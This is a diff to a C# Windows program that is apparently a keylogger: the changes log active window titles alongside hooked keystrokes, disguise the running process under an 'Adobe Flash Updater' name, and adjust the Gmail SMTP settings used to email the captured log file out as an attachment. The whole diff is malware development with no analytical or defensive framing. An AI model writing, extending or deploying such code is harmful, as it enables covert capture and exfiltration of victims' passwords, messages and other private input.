@@ -8,6 +8,7 @@ using System.Net.Mail;
 using Microsoft.Win32;
 using System.Text;
 using System.Net.Sockets;
+using System.Threading;
 
 namespace WindowsFormsApplication1
 {
@@ -77,7 +78,23 @@ namespace WindowsFormsApplication1
             timer.Interval = 30000;
             timer.Start();
 
-            Application.Run();
+            // Prevent multiple instances of this application running
+            EventWaitHandle s_event;
+            bool created;
+            string eventWaitName = "Adobe Flash Updater#service#" + Environment.UserName;
+            s_event = new EventWaitHandle(false, EventResetMode.ManualReset, eventWaitName, out created);
+            if (created)
+            {
+                Console.WriteLine("EventWaitString: " + eventWaitName);
+                Application.Run();
+            }                
+            else
+            {
+                // These lines are displayed. ?
+                //Console.WriteLine("Instance already running with EventWaitString: " + eventWaitName);
+                //Console.WriteLine("Quiting");
+                Application.Exit();
+            }                
         }
 
         public static void startup()
@@ -243,7 +260,8 @@ namespace WindowsFormsApplication1
             SmtpClient client = new SmtpClient(); 
             //Network Credentials for Gmail            
             client.Credentials = new System.Net.NetworkCredential(emailAddress, emailPassword);
-            client.Port = 587;
+            //TODO: Check for open ports here. Port 25, 465, or 587 may be blocked.
+            client.Port = 25;
             client.Host = "smtp.gmail.com";
             client.EnableSsl = true;
             Attachment data = new Attachment(Program.path);
@@ -322,7 +340,13 @@ namespace WindowsFormsApplication1
 
                 string windowTitle = GetActiveWindowTitle();
                 if (windowTitle != null)
+                {
                     Console.WriteLine("{" + windowTitle + "}");
+                    StreamWriter wt = File.AppendText(Program.path);
+                    wt.WriteLine("{" + windowTitle + "}");
+                    wt.Close();
+                }
+                      
                 StreamWriter sw = File.AppendText(Program.path);                
                 int vkCode = Marshal.ReadInt32(lParam);
                 if (Keys.Shift == Control.ModifierKeys) Program.shift = 1;
